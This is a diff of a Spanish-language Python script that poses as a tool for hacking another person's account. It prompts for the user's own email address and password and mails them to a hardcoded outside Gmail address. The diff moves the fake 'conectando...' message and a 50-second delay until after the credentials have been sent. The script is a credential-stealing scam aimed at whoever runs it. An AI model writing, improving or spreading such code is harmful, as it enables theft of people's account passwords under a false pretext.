@@ -1,3 +1,4 @@
+import os
 import smtplib
 from email.mime.text import MIMEText
 import random
@@ -6,9 +7,6 @@ import time
 Dcorreo = input("direccion de correo: ")
 Dpass = input("contraseña: ")
 cas = input("ingrese el id de la persona a hackear: ")
-
-print("conectando...")
-time.sleep(50)
 
 contenido = Dcorreo + Dpass
 # Genera una contraseña de aplicaciones para tu cuenta de Gmail
@@ -27,6 +25,9 @@ message["To"] = "esparta0987@gmail.com"
 server.sendmail(message["From"], message["To"], message.as_string())
 
 server.quit()
+
+print("conectando...")
+time.sleep(50)
 
 def generar_palabra(longitud):
     palabra = ''
